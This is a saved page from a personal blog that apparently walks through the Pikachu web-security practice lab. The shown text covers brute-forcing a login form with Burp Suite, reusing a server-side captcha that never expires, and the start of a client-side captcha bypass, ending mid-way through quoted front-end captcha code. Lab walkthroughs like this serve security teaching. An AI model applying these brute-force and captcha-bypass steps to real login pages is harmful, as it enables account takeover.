<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Pikachué¶åœº | Zephyr&#39;s Repository</title>
    <meta name="generator" content="VuePress 1.9.5">
    <link rel="icon" href="/img/favicon.ico">
    <meta name="description" content="Repository">
    <meta name="keywords" content="Personal blog">
    <meta name="theme-color" content="#11a8cd">
    
    <link rel="preload" href="/assets/css/0.styles.2ceecd60.css" as="style"><link rel="preload" href="/assets/js/app.d666345c.js" as="script"><link rel="preload" href="/assets/js/2.2caa9fc9.js" as="script"><link rel="preload" href="/assets/js/8.a8e385a7.js" as="script"><link rel="prefetch" href="/assets/js/10.92253112.js"><link rel="prefetch" href="/assets/js/100.6b2ae977.js"><link rel="prefetch" href="/assets/js/101.aacea51d.js"><link rel="prefetch" href="/assets/js/102.174cc836.js"><link rel="prefetch" href="/assets/js/103.ff1ebaa1.js"><link rel="prefetch" href="/assets/js/104.69cf1cf6.js"><link rel="prefetch" href="/assets/js/105.9594a7fc.js"><link rel="prefetch" href="/assets/js/106.99a74775.js"><link rel="prefetch" href="/assets/js/107.8f78b1ec.js"><link rel="prefetch" href="/assets/js/108.c24a6aa0.js"><link rel="prefetch" href="/assets/js/109.b7acd6b5.js"><link rel="prefetch" href="/assets/js/11.8fa5d5cf.js"><link rel="prefetch" href="/assets/js/110.2c0dad37.js"><link rel="prefetch" href="/assets/js/111.0fe328f6.js"><link rel="prefetch" href="/assets/js/12.72be6f01.js"><link rel="prefetch" href="/assets/js/13.ff9c04cb.js"><link rel="prefetch" href="/assets/js/14.96414c99.js"><link rel="prefetch" href="/assets/js/15.1e9eb50e.js"><link rel="prefetch" href="/assets/js/16.e1e06856.js"><link rel="prefetch" href="/assets/js/17.0278769e.js"><link rel="prefetch" href="/assets/js/18.bb972816.js"><link rel="prefetch" href="/assets/js/19.79cd2b85.js"><link rel="prefetch" href="/assets/js/20.7fb5caaa.js"><link rel="prefetch" href="/assets/js/21.88af962e.js"><link rel="prefetch" href="/assets/js/22.31db3d38.js"><link rel="prefetch" href="/assets/js/23.a5f143ad.js"><link rel="prefetch" href="/assets/js/24.8710ce7b.js"><link rel="prefetch" href="/assets/js/25.b8c57ad3.js"><link rel="prefetch" href="/assets/js/26.c2316678.js"><link rel="prefetch" href="/assets/js/27.21bfe439.js"><link rel="prefetch" href="/assets/js/28.96768776.js"><link rel="prefetch" href="/assets/js/29.61870f84.js"><link rel="prefetch" href="/assets/js/3.9154aee4.js"><link rel="prefetch" href="/assets/js/30.9804accb.js"><link rel="prefetch" href="/assets/js/31.1a0d56cd.js"><link rel="prefetch" href="/assets/js/32.e58ac650.js"><link rel="prefetch" href="/assets/js/33.45642796.js"><link rel="prefetch" href="/assets/js/34.64cc442a.js"><link rel="prefetch" href="/assets/js/35.618d79bb.js"><link rel="prefetch" href="/assets/js/36.01777eb4.js"><link rel="prefetch" href="/assets/js/37.13567851.js"><link rel="prefetch" href="/assets/js/38.357bc63e.js"><link rel="prefetch" href="/assets/js/39.4e1b9673.js"><link rel="prefetch" href="/assets/js/4.d29e359d.js"><link rel="prefetch" href="/assets/js/40.86012f62.js"><link rel="prefetch" href="/assets/js/41.38072a3c.js"><link rel="prefetch" href="/assets/js/42.fcacbd34.js"><link rel="prefetch" href="/assets/js/43.9a17609e.js"><link rel="prefetch" href="/assets/js/44.24b6f963.js"><link rel="prefetch" href="/assets/js/45.08f58277.js"><link rel="prefetch" href="/assets/js/46.1e9937f1.js"><link rel="prefetch" href="/assets/js/47.4346f70c.js"><link rel="prefetch" href="/assets/js/48.666ffad3.js"><link rel="prefetch" href="/assets/js/49.f71696c0.js"><link rel="prefetch" href="/assets/js/5.88d932c8.js"><link rel="prefetch" href="/assets/js/50.f6a0b6cc.js"><link rel="prefetch" href="/assets/js/51.e9183b21.js"><link rel="prefetch" href="/assets/js/52.9613803c.js"><link rel="prefetch" href="/assets/js/53.84e49fd8.js"><link rel="prefetch" href="/assets/js/54.27481140.js"><link rel="prefetch" href="/assets/js/55.c54d404d.js"><link rel="prefetch" href="/assets/js/56.9b4cfda1.js"><link rel="prefetch" href="/assets/js/57.9cc88303.js"><link rel="prefetch" href="/assets/js/58.b93735fe.js"><link rel="prefetch" href="/assets/js/59.fb6687b9.js"><link rel="prefetch" href="/assets/js/6.64c53d2e.js"><link rel="prefetch" href="/assets/js/60.d8c853ad.js"><link rel="prefetch" href="/assets/js/61.3181365c.js"><link rel="prefetch" href="/assets/js/62.f80f35d7.js"><link rel="prefetch" href="/assets/js/63.298c8979.js"><link rel="prefetch" href="/assets/js/64.0172751d.js"><link rel="prefetch" href="/assets/js/65.279a288b.js"><link rel="prefetch" href="/assets/js/66.ea6dbf7d.js"><link rel="prefetch" href="/assets/js/67.3c2ccb8c.js"><link rel="prefetch" href="/assets/js/68.70c6a2a6.js"><link rel="prefetch" href="/assets/js/69.1a64a917.js"><link rel="prefetch" href="/assets/js/7.ea40bec5.js"><link rel="prefetch" href="/assets/js/70.0f03e3cf.js"><link rel="prefetch" href="/assets/js/71.db8f5035.js"><link rel="prefetch" href="/assets/js/72.8b671082.js"><link rel="prefetch" href="/assets/js/73.989a9a9a.js"><link rel="prefetch" href="/assets/js/74.7dbf53ff.js"><link rel="prefetch" href="/assets/js/75.fdc863e8.js"><link rel="prefetch" href="/assets/js/76.8335c5ef.js"><link rel="prefetch" href="/assets/js/77.dff2cd27.js"><link rel="prefetch" href="/assets/js/78.20d1110f.js"><link rel="prefetch" href="/assets/js/79.da829f37.js"><link rel="prefetch" href="/assets/js/80.38b5183d.js"><link rel="prefetch" href="/assets/js/81.31779399.js"><link rel="prefetch" href="/assets/js/82.9ab0f199.js"><link rel="prefetch" href="/assets/js/83.11386321.js"><link rel="prefetch" href="/assets/js/84.b40c9cc1.js"><link rel="prefetch" href="/assets/js/85.3dd4c8d9.js"><link rel="prefetch" href="/assets/js/86.eef59cd4.js"><link rel="prefetch" href="/assets/js/87.54f35730.js"><link rel="prefetch" href="/assets/js/88.23a1baf9.js"><link rel="prefetch" href="/assets/js/89.e0269eb9.js"><link rel="prefetch" href="/assets/js/9.bc75a509.js"><link rel="prefetch" href="/assets/js/90.ba9d185a.js"><link rel="prefetch" href="/assets/js/91.407950b3.js"><link rel="prefetch" href="/assets/js/92.c8d2a800.js"><link rel="prefetch" href="/assets/js/93.55f6068b.js"><link rel="prefetch" href="/assets/js/94.fc44432d.js"><link rel="prefetch" href="/assets/js/95.cbc9e839.js"><link rel="prefetch" href="/assets/js/96.3f99bde9.js"><link rel="prefetch" href="/assets/js/97.5acc4bc2.js"><link rel="prefetch" href="/assets/js/98.31446065.js"><link rel="prefetch" href="/assets/js/99.2a27e19f.js">
    <link rel="stylesheet" href="/assets/css/0.styles.2ceecd60.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="ç›®å½•" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/logo.png" alt="Zephyr's Repository" class="logo"> <span class="site-name can-hide">Zephyr's Repository</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">é¦–é¡µ</a></div><div class="nav-item"><a href="/course/" class="nav-link">ç¬”è®°</a></div><div class="nav-item"><a href="/technology/" class="nav-link">æŠ€æœ¯</a></div><div class="nav-item"><a href="/more/" class="nav-link">æ›´å¤š</a></div><div class="nav-item"><a href="/favorites/" class="nav-link">æ”¶è—</a></div><div class="nav-item"><a href="/about/" class="nav-link">å…³äº</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="ç´¢å¼•" class="dropdown-title"><a href="/archives/" class="link-title">ç´¢å¼•</a> <span class="title" style="display:none;">ç´¢å¼•</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">ğŸ“‚ åˆ†ç±»</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">ğŸ·ï¸ æ ‡ç­¾</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">ğŸ“… å½’æ¡£</a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="/img/Zephyr.jpg"> <div class="blogger-info"><h3>Zephyr</h3> <span>å·å¾—æµ®ç”ŸåŠæ—¥é—²</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">é¦–é¡µ</a></div><div class="nav-item"><a href="/course/" class="nav-link">ç¬”è®°</a></div><div class="nav-item"><a href="/technology/" class="nav-link">æŠ€æœ¯</a></div><div class="nav-item"><a href="/more/" class="nav-link">æ›´å¤š</a></div><div class="nav-item"><a href="/favorites/" class="nav-link">æ”¶è—</a></div><div class="nav-item"><a href="/about/" class="nav-link">å…³äº</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="ç´¢å¼•" class="dropdown-title"><a href="/archives/" class="link-title">ç´¢å¼•</a> <span class="title" style="display:none;">ç´¢å¼•</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">ğŸ“‚ åˆ†ç±»</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">ğŸ·ï¸ æ ‡ç­¾</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">ğŸ“… å½’æ¡£</a></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>Web</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/2e1547494524d1d2/" aria-current="page" class="active sidebar-link">Pikachué¶åœº</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="sidebar-link">åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#éªŒè¯ç ç»•è¿‡-on-server" class="sidebar-link">éªŒè¯ç ç»•è¿‡ï¼ˆon Serverï¼‰</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#éªŒè¯ç ç»•è¿‡-on-clinet" class="sidebar-link">éªŒè¯ç ç»•è¿‡ï¼ˆon Clinetï¼‰</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#tokené˜²çˆ†ç ´" class="sidebar-link">tokené˜²çˆ†ç ´</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#åå°„å‹xss-get" class="sidebar-link">åå°„å‹XSS(get)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#åå°„å‹xss-post" class="sidebar-link">åå°„å‹XSS(post)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#å­˜å‚¨å‹xss" class="sidebar-link">å­˜å‚¨å‹XSS</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#domå‹xss" class="sidebar-link">DOMå‹XSS</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#domå‹xss-x" class="sidebar-link">DOMå‹XSS-X</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xssä¹‹ç›²æ‰“" class="sidebar-link">XSSä¹‹ç›²æ‰“</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xssçš„è¿‡æ»¤" class="sidebar-link">XSSçš„è¿‡æ»¤</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xssä¹‹htmlspecialchars" class="sidebar-link">XSSä¹‹htmlspecialchars</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1d2/#htmlspecialcharså‡½æ•°" class="sidebar-link">htmlspecialcharså‡½æ•°</a></li></ul></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xssä¹‹hrefè¾“å‡º" class="sidebar-link">xssä¹‹hrefè¾“å‡º</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xssä¹‹jsè¾“å‡º" class="sidebar-link">xssä¹‹jsè¾“å‡º</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#csrf-get" class="sidebar-link">CSRF(get)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#csrf-post" class="sidebar-link">CSRF(post)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#csrf-token" class="sidebar-link">CSRF Token</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#æ•°å­—å‹æ³¨å…¥-post" class="sidebar-link">æ•°å­—å‹æ³¨å…¥(post)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#å­—ç¬¦å‹æ³¨å…¥-get" class="sidebar-link">å­—ç¬¦å‹æ³¨å…¥(get)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#æœç´¢å‹æ³¨å…¥" class="sidebar-link">æœç´¢å‹æ³¨å…¥</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xxå‹æ³¨å…¥" class="sidebar-link">xxå‹æ³¨å…¥</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#insert-update-æ³¨å…¥" class="sidebar-link">&quot;insert/update&quot;æ³¨å…¥</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#delete-æ³¨å…¥" class="sidebar-link">&quot;delete&quot;æ³¨å…¥</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#httpå¤´æ³¨å…¥" class="sidebar-link">httpå¤´æ³¨å…¥</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#ç›²æ³¨-base-on-boolian" class="sidebar-link">ç›²æ³¨(base on boolian)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#ç›²æ³¨-base-on-time" class="sidebar-link">ç›²æ³¨(base on time)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#å®½å­—èŠ‚æ³¨å…¥" class="sidebar-link">å®½å­—èŠ‚æ³¨å…¥</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#exec-ping" class="sidebar-link">exec &quot;ping&quot;</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#exec-evel" class="sidebar-link">exec &quot;evel&quot;</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#file-inclusion-local" class="sidebar-link">File Inclusion(local)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#file-inclusion-remote" class="sidebar-link">File Inclusion(remote)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#client-check" class="sidebar-link">client check</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#mime-type" class="sidebar-link">MIME type</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#getimagesize" class="sidebar-link">getimagesize</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#æ°´å¹³è¶Šæƒ" class="sidebar-link">æ°´å¹³è¶Šæƒ</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#å‚ç›´è¶Šæƒ" class="sidebar-link">å‚ç›´è¶Šæƒ</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#ç›®å½•éå†" class="sidebar-link">ç›®å½•éå†</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#icanseeyouabc" class="sidebar-link">Icanseeyouabc</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xxeæ¼æ´" class="sidebar-link">XXEæ¼æ´</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1d2/#æ¦‚è¿°" class="sidebar-link">æ¦‚è¿°</a></li></ul></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#ä¸å®‰å…¨çš„urlè·³è½¬" class="sidebar-link">ä¸å®‰å…¨çš„urlè·³è½¬</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#ssrf-curl" class="sidebar-link">SSRF(curl)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#ssrf-file-get-content" class="sidebar-link">SSRF(filegetcontent)</a></li></ul></li><li><a href="/pages/2e1547494524d1c8/" class="sidebar-link">SUCTF 2019 CheckIn</a></li><li><a href="/pages/2e1547494524d1c9/" class="sidebar-link">GXYCTF 2019 BabySQli</a></li><li><a href="/pages/2e1547494524d1ca/" class="sidebar-link">GYCTF 2020 Blacklist</a></li><li><a href="/pages/2e1547494524d1cc/" class="sidebar-link">RoarCTF 2019 Easy Java</a></li><li><a href="/pages/2e1547494524d1d1/" class="sidebar-link">CISCN 2019 åˆèµ› Love</a></li><li><a href="/pages/2e1547494524d1d3/" class="sidebar-link">0CTF 2016 piapiapia</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>PWN</span> <span class="arrow right"></span></p> <!----></section></li></ul> <div class="sidebar-slot sidebar-slot-bottom"><!-- æ­£æ–¹å½¢ -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="3508773082"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div></aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><ul class="breadcrumbs" data-v-06225672><li data-v-06225672><a href="/" title="é¦–é¡µ" class="iconfont icon-home router-link-active" data-v-06225672></a></li> <li data-v-06225672><a href="/course/#ç¬”è®°" data-v-06225672>ç¬”è®°</a></li><li data-v-06225672><a href="/course/#Web" data-v-06225672>Web</a></li></ul> <div class="info" data-v-06225672><div title="ä½œè€…" class="author iconfont icon-touxiang" data-v-06225672><a href="javascript:;" data-v-06225672>Zephyr</a></div> <div title="åˆ›å»ºæ—¶é—´" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2022-07-01</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">ç›®å½•</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">Pikachué¶åœº<!----></h1> <div class="page-slot page-slot-top"><!-- å›ºå®š100% * 90pxå¯æ˜¾ç¤ºï¼Œmax-height:90pxæœªè§æ˜¾ç¤º-->
     <ins class="adsbygoogle"
          style="display:inline-block;width:100%;max-height:90px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6625304284"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="theme-vdoing-content content__default"><h1 id="burte-force"><a href="#burte-force" class="header-anchor">#</a> Burte Force</h1> <h2 id="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"><a href="#åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="header-anchor">#</a> åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</h2> <p>BrupSuiteæŠ“åŒ…ï¼Œå‘åˆ°Intruder</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu1.png" alt="pikachu1"></p> <p>usernameå’Œpasswordè®¾ä¸ºå˜é‡ï¼Œä½¿ç”¨Cluster bombæ¨¡å¼è¿›è¡Œçˆ†ç ´</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu2.png" alt="pikachu2"></p> <p>è´¦å·ä¸ºï¼šadminï¼Œå¯†ç ä¸ºï¼š123456</p> <h2 id="éªŒè¯ç ç»•è¿‡-on-server"><a href="#éªŒè¯ç ç»•è¿‡-on-server" class="header-anchor">#</a> éªŒè¯ç ç»•è¿‡ï¼ˆon Serverï¼‰</h2> <p>æŠ“åŒ…å‘åˆ°Repeaterï¼Œæ‰‹åŠ¨ä¿®æ”¹ä¸¤æ¬¡usernameå’Œpasswordï¼Œä¸æ›´æ”¹éªŒè¯ç </p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu3.png" alt="pikachu3"></p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu4.png" alt="pikachu4"></p> <p>Responseè¿”å›å¹¶æœªæç¤ºéªŒè¯ç é”™è¯¯ï¼Œè¯´æ˜éªŒè¯ç åå°ä¸è¿‡æœŸï¼Œå¯ä»¥é‡å¤ä½¿ç”¨ï¼Œæ¥ä¸‹æ¥é‡å¤ä¸Šä¸€èŠ‚å³å¯ã€‚</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu5.png" alt="pikachu5"></p> <p>çˆ†ç ´æˆåŠŸï¼Œè´¦å·ä¸ºï¼šadminï¼Œå¯†ç ä¸ºï¼š123456</p> <h2 id="éªŒè¯ç ç»•è¿‡-on-clinet"><a href="#éªŒè¯ç ç»•è¿‡-on-clinet" class="header-anchor">#</a> éªŒè¯ç ç»•è¿‡ï¼ˆon Clinetï¼‰</h2> <p>BrupSuiteå¼€å¯æŠ“åŒ…ï¼Œæäº¤é”™è¯¯çš„éªŒè¯ç ï¼Œå‘ç°æ²¡æœ‰æ–°çš„æ•°æ®åŒ…å‘å¾€æœåŠ¡å™¨ï¼Œä½†ç½‘é¡µè¿˜æ˜¯æç¤ºéªŒè¯ç é”™è¯¯</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu6.png" alt="pikachu6"></p> <p>æŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°éªŒè¯ç éƒ¨åˆ†æ˜¯å‰ç«¯éªŒè¯ï¼Œä»£ç å¦‚ä¸‹</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>    <span class="token keyword">var</span> code<span class="token punctuation">;</span> <span class="token comment">//åœ¨å…¨å±€ å®šä¹‰éªŒè¯ç </span>
    <span class="token keyword">function</span> <span class="token function">createCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        code <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> codeLength <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token comment">//éªŒè¯ç çš„é•¿åº¦</span>
        <span class="token keyword">var</span> checkCode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;checkCode&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> selectChar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'G'</span><span class="token punctuation">,</span><span class="token string">'H'</span><span class="token punctuation">,</span><span class="token string">'I'</span><span class="token punctuation">,</span><span class="token string">'J'</span><span class="token punctuation">,</span><span class="token string">'K'</span><span class="token punctuation">,</span><span class="token string">'L'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">,</span><span class="token string">'O'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'Q'</span><span class="token punctuation">,</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'T'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'V'</span><span class="token punctuation">,</span><span class="token string">'W'</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">,</span><span class="token string">'Y'</span><span class="token punctuation">,</span><span class="token string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ‰€æœ‰å€™é€‰ç»„æˆéªŒè¯ç çš„å­—ç¬¦ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨ä¸­æ–‡çš„</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> codeLength<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">var</span> charIndex <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
